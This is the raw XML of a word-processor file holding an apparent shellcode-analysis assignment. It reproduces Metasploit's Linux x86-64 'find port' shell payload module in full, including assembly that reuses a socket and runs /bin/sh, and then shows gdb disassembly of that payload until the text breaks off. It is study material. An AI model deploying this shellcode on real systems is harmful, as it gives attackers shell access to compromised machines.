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bfb" officeooo:paragraph-rsid="000e6bfb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e6bfb" officeooo:paragraph-rsid="000e6bfb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ea578" officeooo:paragraph-rsid="000ea578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0ea578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305084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322b96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344f6b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039e2" officeooo:paragraph-rsid="001039e2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officeooo:rsid="000ea578" officeooo:paragraph-rsid="001039e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1a18b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34ac7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68d43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78e13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039e2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305084" style:font-weight-asian="bold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34245d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0ea578" officeooo:paragraph-rsid="0011a18b" style:font-weight-asian="bold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1a18b" officeooo:paragraph-rsid="0011a18b" style:font-weight-asian="bold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78e13" officeooo:paragraph-rsid="00193b94" style:font-weight-asian="bold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93b94" officeooo:paragraph-rsid="00193b94" style:font-weight-asian="bold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c4fe9" officeooo:paragraph-rsid="001c4fe9" style:font-weight-asian="bold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305084" officeooo:paragraph-rsid="00305084" style:font-weight-asian="bold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305084" officeooo:paragraph-rsid="0034245d" style:font-weight-asian="bold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305084" officeooo:paragraph-rsid="00344f6b" style:font-weight-asian="bold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05084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22b96" style:font-weight-asian="bold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4245d" style:font-weight-asian="bold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44f6b" style:font-weight-asian="bold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34ac7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4014f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451e0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68d43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78e13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93b94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2011ec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178e13" officeooo:paragraph-rsid="00178e13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2011ec" officeooo:paragraph-rsid="002011ec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305084" officeooo:paragraph-rsid="0034245d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305084" officeooo:paragraph-rsid="00322b96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344f6b" officeooo:paragraph-rsid="00344f6b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normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="002d65c8" officeooo:paragraph-rsid="002d65c8" fo:background-color="#ffffff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561b" officeooo:paragraph-rsid="0011561b" style:font-weight-asian="normal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561b" officeooo:paragraph-rsid="00132f04" style:font-weight-asian="normal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561b" officeooo:paragraph-rsid="00322b96" style:font-weight-asian="normal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a18b" officeooo:paragraph-rsid="0011a18b" style:font-weight-asian="normal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32f04" officeooo:paragraph-rsid="00132f04" style:font-weight-asian="normal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4014f" officeooo:paragraph-rsid="0014014f" style:font-weight-asian="normal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2b8b24" officeooo:paragraph-rsid="002b8b24" style:font-weight-asian="normal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34ac7" officeooo:paragraph-rsid="00322b96" style:font-weight-asian="normal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bold" officeooo:rsid="0011561b" officeooo:paragraph-rsid="0011a18b" style:font-weight-asian="bold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bold" officeooo:rsid="0011a18b" officeooo:paragraph-rsid="0011a18b" style:font-weight-asian="bold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34ac7" officeooo:paragraph-rsid="00134ac7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34ac7" officeooo:paragraph-rsid="0034245d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014f" officeooo:paragraph-rsid="0014014f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68d43" officeooo:paragraph-rsid="00168d43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68d43" officeooo:paragraph-rsid="0034245d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78e13" officeooo:paragraph-rsid="00168d43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78e13" officeooo:paragraph-rsid="00178e13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cb409" officeooo:paragraph-rsid="001cb409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93b94" officeooo:paragraph-rsid="00193b94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2011ec" officeooo:paragraph-rsid="002011ec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2011ec" officeooo:paragraph-rsid="00344f6b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203b5a" officeooo:paragraph-rsid="00203b5a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e77d" officeooo:paragraph-rsid="00168d43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e77d" officeooo:paragraph-rsid="002b8b24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344f6b" officeooo:paragraph-rsid="00344f6b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351640" officeooo:paragraph-rsid="00351640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bold" officeooo:rsid="001cb409" officeooo:paragraph-rsid="001cb409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style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00203b5a" officeooo:paragraph-rsid="00203b5a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style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00214f53" officeooo:paragraph-rsid="00214f53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style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00230950" officeooo:paragraph-rsid="00230950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51e0" officeooo:paragraph-rsid="00168d43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51e0" officeooo:paragraph-rsid="001451e0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68d43" officeooo:paragraph-rsid="00168d43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014f" officeooo:paragraph-rsid="0014014f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014f" officeooo:paragraph-rsid="001451e0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34ac7" officeooo:paragraph-rsid="00134ac7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2b8b24" officeooo:paragraph-rsid="002b8b24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ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0011561b" officeooo:paragraph-rsid="00132f04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ff" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0011561b" officeooo:paragraph-rsid="0014014f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78e13" officeooo:paragraph-rsid="001cb409" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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78e13" officeooo:paragraph-rsid="00178e13" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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78e13" officeooo:paragraph-rsid="00193b94" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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93b94" officeooo:paragraph-rsid="00193b94" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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203b5a" officeooo:paragraph-rsid="00203b5a" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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203b5a" officeooo:paragraph-rsid="0026dc30" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold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230950" officeooo:paragraph-rsid="00230950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23d1e4" officeooo:paragraph-rsid="00230950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fo:font-weight="bold" officeooo:rsid="001451e0" officeooo:paragraph-rsid="001451e0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margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="00305084" officeooo:paragraph-rsid="00305084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05084" officeooo:paragraph-rsid="00322b96"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="00305084" officeooo:paragraph-rsid="0034245d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99" fo:font-weight="bold" officeooo:rsid="002601a6" officeooo:paragraph-rsid="00305084" style:font-weight-asian="bold" style:font-weight-complex="bold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4245d" officeooo:paragraph-rsid="0034245d"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties officeooo:rsid="0034245d" officeooo:paragraph-rsid="0034245d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c00" officeooo:rsid="0034245d" officeooo:paragraph-rsid="0034245d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23d1e4" officeooo:paragraph-rsid="0023d1e4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398e02" officeooo:paragraph-rsid="00398e02" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000ea578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color="#c5000b" fo:font-weight="bold" officeooo:rsid="000ea578" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-weight="bold" officeooo:rsid="00305084" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-weight="bold" officeooo:rsid="00322b96" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-weight="bold" officeooo:rsid="00344f6b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000ea578" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00322b96" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#c5000b" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00305084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05084" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#3333ff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3333ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00132f04" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#3333ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0011561b" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#3333ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0019484b" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#3333ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00203b5a" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#3333ff" fo:font-weight="bold" officeooo:rsid="0011561b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4e77d" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00168d43" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00178e13" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0017e0f8" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00322b96" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0034245d" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00344f6b" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00168d43" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="0011a18b"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T2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000000" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00168d43" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00178e13" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="001cb409" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0034245d" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="0014014f"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="00178e13" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="0017e0f8" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="00193b94" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="001c4fe9" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="00168d43" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" officeooo:rsid="0036f178" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-weight="bold" officeooo:rsid="001451e0" style:font-weight-asian="bold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168d43" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="0034245d" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" officeooo:rsid="00230950" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties officeooo:rsid="0019484b"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="00230950"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="0023d1e4"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="00249a66"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties officeooo:rsid="00250501"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties officeooo:rsid="0029bcfa"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties officeooo:rsid="001451e0"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="001c4fe9" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties officeooo:rsid="002f1cf2"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties officeooo:rsid="00305084"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="00322b96"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="0034245d"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties fo:color="#00cc00"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties officeooo:rsid="00351640"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="0036f178"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties officeooo:rsid="00386f92"/>
    </style:style>
    <style:style style:name="gr1" style:family="graphic">
      <style:graphic-properties svg:stroke-width="0.0402in" draw:marker-start-width="0.2602in" draw:marker-end-width="0.260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98in" draw:marker-start-width="0.3193in" draw:marker-end-width="0.3193in" draw:fill="none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4"/>Shellcode Analysis <text:s text:c="2"/>“Shell find port” , <text:span text:style-name="T56">slae64 -1337</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T1">(found in <text:s/>Metasploit x86/64 payload Linux) </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P95"><text:span text:style-name="T1">l</text:span>ook for the metasploit file </text:p>
      <text:p text:style-name="P2"><draw:rect text:anchor-type="paragraph" draw:z-index="37" draw:style-name="gr4" draw:text-style-name="P99" svg:width="6.8815in" svg:height="9.263in" svg:x="-0.1244in" svg:y="0.1752in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P96">##</text:p>
      <text:p text:style-name="P96"># This module requires Metasploit: http//metasploit.com/download</text:p>
      <text:p text:style-name="P96"># Current source: https://github.com/rapid7/metasploit-framework</text:p>
      <text:p text:style-name="P96">##</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96">require 'msf/core'</text:p>
      <text:p text:style-name="P96">require 'msf/core/handler/find_port'</text:p>
      <text:p text:style-name="P96">require 'msf/base/sessions/command_shell'</text:p>
      <text:p text:style-name="P96">require 'msf/base/sessions/command_shell_options'</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96">module Metasploit3</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96"><text:s text:c="2"/>include Msf::Payload::Single</text:p>
      <text:p text:style-name="P96"><text:s text:c="2"/>include Msf::Payload::Linux</text:p>
      <text:p text:style-name="P96"><text:s text:c="2"/>include Msf::Sessions::CommandShellOptions</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96"><text:s text:c="2"/>def initialize(info = {})</text:p>
      <text:p text:style-name="P96"><text:s text:c="4"/>super(merge_info(info,</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Name' <text:s text:c="9"/>=&gt; 'Linux Command Shell, Find Port Inline',</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Description' <text:s text:c="2"/>=&gt; 'Spawn a shell on an established connection',</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Author' <text:s text:c="7"/>=&gt; 'mak',</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'License' <text:s text:c="6"/>=&gt; MSF_LICENSE,</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Platform' <text:s text:c="5"/>=&gt; 'linux',</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Arch' <text:s text:c="9"/>=&gt; ARCH_X86_64,</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Handler' <text:s text:c="6"/>=&gt; Msf::Handler::FindPort,</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Session' <text:s text:c="6"/>=&gt; Msf::Sessions::CommandShellUnix,</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>'Payload' <text:s text:c="6"/>=&gt;</text:p>
      <text:p text:style-name="P96"><text:s text:c="8"/>{</text:p>
      <text:p text:style-name="P96"><text:s text:c="10"/>'Offsets' =&gt;</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>{</text:p>
      <text:p text:style-name="P96"><text:s text:c="14"/>'CPORT' =&gt; [ 32, 'n' ],</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>},</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96"><text:s text:c="10"/>'Assembly' =&gt; %Q|</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>xor rdi,rdi</text:p>
      <text:p text:style-name="P94"><text:s text:c="11"/><text:span text:style-name="T60"><text:s/>xor rbx,rbx</text:span></text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov bl,0x14</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>sub rsp,rbx</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>lea rdx,[rsp]</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>lea rsi,[rsp+4]</text:p>
      <text:p text:style-name="P96"><text:s text:c="10"/>find_port:</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>push 0x34 <text:s text:c="4"/>; getpeername</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>pop rax</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>syscall</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>inc rdi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>cmp word [rsi+2],0x4142</text:p>
      <text:p text:style-name="P94"><draw:rect text:anchor-type="paragraph" draw:z-index="38" draw:style-name="gr4" draw:text-style-name="P99" svg:width="6.8815in" svg:height="6.6413in" svg:x="-0.1244in" svg:y="-0.0228in"><text:p/></draw:rect><text:soft-page-break/> <text:s text:c="8"/><text:span text:style-name="T60"><text:s text:c="3"/>jne find_port</text:span></text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>dec rdi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>push 2</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>pop rsi</text:p>
      <text:p text:style-name="P96"><text:s text:c="10"/>dup2:</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>push 0x21 <text:s text:c="4"/>; dup2</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>pop rax</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>syscall</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>dec rsi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>jns dup2</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov rbx,rsi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov ebx, 0x68732f41</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov eax,0x6e69622f</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>shr rbx,8</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>shl rbx,32</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>or <text:s/>rax,rbx</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>push rax</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov rdi,rsp</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>xor rsi,rsi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>mov rdx,rsi</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>push 0x3b <text:s text:c="4"/>; execve</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>pop rax</text:p>
      <text:p text:style-name="P96"><text:s text:c="12"/>syscall</text:p>
      <text:p text:style-name="P96"><text:s text:c="10"/>|</text:p>
      <text:p text:style-name="P96"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P96"><text:s text:c="6"/>))</text:p>
      <text:p text:style-name="P96"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96"><text:s text:c="2"/>def size</text:p>
      <text:p text:style-name="P96"><text:s text:c="4"/>return 91</text:p>
      <text:p text:style-name="P96"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96"/>
      <text:p text:style-name="P96">end</text:p>
      <text:p text:style-name="P93"/>
      <text:p text:style-name="P93">(I use <text:span text:style-name="T57">gdb to disassemble this code <text:s/></text:span>) <text:span text:style-name="T61">metasploit file help to understand what's happen and you can compare if the metasploit assembly code is the same with the gdb output</text:span></text:p>
      <text:p text:style-name="P5"><draw:rect text:anchor-type="paragraph" draw:z-index="42" draw:style-name="gr4" draw:text-style-name="P99" svg:width="6.8815in" svg:height="2.9776in" svg:x="-0.1244in" svg:y="0.1874in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P90"># gdb shellcode-to-disassemble </text:p>
      <text:p text:style-name="P90">GNU gdb (GDB) 7.4.1-debian </text:p>
      <text:p text:style-name="P90">Copyright (C) 2012 Free Software Foundation, Inc. </text:p>
      <text:p text:style-name="P90">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; </text:p>
      <text:p text:style-name="P90">This is free software: you are free to change and redistribute it. </text:p>
      <text:p text:style-name="P90">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying" </text:p>
      <text:p text:style-name="P90">and "show warranty" for details. </text:p>
      <text:p text:style-name="P90">This GDB was configured as "x86_64-linux-gnu". </text:p>
      <text:p text:style-name="P90">For bug reporting instructions, please see: </text:p>
      <text:p text:style-name="P90">&lt;http://www.gnu.org/software/gdb/bugs/&gt;... </text:p>
      <text:p text:style-name="P90">Reading symbols from /root/Desktop/ExamRev/Assignment5/Shell_find_port/shellcode-to-disassemble...(no debugging symbols found)...done. </text:p>
      <text:p text:style-name="P90"><draw:rect text:anchor-type="paragraph" draw:z-index="34" draw:style-name="gr4" draw:text-style-name="P99" svg:width="6.8815in" svg:height="9.4567in" svg:x="-0.1244in" svg:y="-0.0783in"><text:p/></draw:rect><text:soft-page-break/>(gdb) set disassembly-flavor intel </text:p>
      <text:p text:style-name="P90">(gdb) b *&amp;code </text:p>
      <text:p text:style-name="P90">Breakpoint 1 at 0x600980 </text:p>
      <text:p text:style-name="P90">(gdb) disassemble </text:p>
      <text:p text:style-name="P90">No frame selected. </text:p>
      <text:p text:style-name="P90">(gdb) r </text:p>
      <text:p text:style-name="P90">Starting program: /root/Desktop/ExamRev/Assignment5/Shell_find_port/shellcode-to-disassemble </text:p>
      <text:p text:style-name="P90">Shellcode Length: <text:s/>91 </text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="P90">Breakpoint 1, 0x0000000000600980 in code () </text:p>
      <text:p text:style-name="P90">(gdb) disassemble </text:p>
      <text:p text:style-name="P90">Dump of assembler code for function code: </text:p>
      <text:p text:style-name="P90">=&gt; 0x0000000000600980 &lt;+0&gt;:<text:tab/>xor <text:s text:c="3"/>rdi,rdi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600983 &lt;+3&gt;:<text:tab/>xor <text:s text:c="3"/>rbx,rbx </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600986 &lt;+6&gt;:<text:tab/>mov <text:s text:c="3"/>bl,0x14 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600988 &lt;+8&gt;:<text:tab/>sub <text:s text:c="3"/>rsp,rbx </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x000000000060098b &lt;+11&gt;:<text:tab/>lea <text:s text:c="3"/>rdx,[rsp] </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x000000000060098f &lt;+15&gt;:<text:tab/>lea <text:s text:c="3"/>rsi,[rsp+0x4] </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600994 &lt;+20&gt;:<text:tab/>push <text:s text:c="2"/>0x34 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600996 &lt;+22&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600997 &lt;+23&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x0000000000600999 &lt;+25&gt;:<text:tab/>inc <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x000000000060099c &lt;+28&gt;:<text:tab/>cmp <text:s text:c="3"/>WORD PTR [rsi+0x2],0x4142</text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009a2 &lt;+34&gt;:<text:tab/>jne <text:s text:c="3"/>0x600994 &lt;code+20&gt; </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009a4 &lt;+36&gt;:<text:tab/>dec <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009a7 &lt;+39&gt;:<text:tab/>push <text:s text:c="2"/>0x2 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009a9 &lt;+41&gt;:<text:tab/>pop <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009aa &lt;+42&gt;:<text:tab/>push <text:s text:c="2"/>0x21 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009ac &lt;+44&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009ad &lt;+45&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009af &lt;+47&gt;:<text:tab/>dec <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009b2 &lt;+50&gt;:<text:tab/>jns <text:s text:c="3"/>0x6009aa &lt;code+42&gt; </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009b4 &lt;+52&gt;:<text:tab/>mov <text:s text:c="3"/>rbx,rsi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009b7 &lt;+55&gt;:<text:tab/>mov <text:s text:c="3"/>ebx,0x68732f41 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009bc &lt;+60&gt;:<text:tab/>mov <text:s text:c="3"/>eax,0x6e69622f </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009c1 &lt;+65&gt;:<text:tab/>shr <text:s text:c="3"/>rbx,0x8 </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009c5 &lt;+69&gt;:<text:tab/>shl <text:s text:c="3"/>rbx,0x20 </text:p>
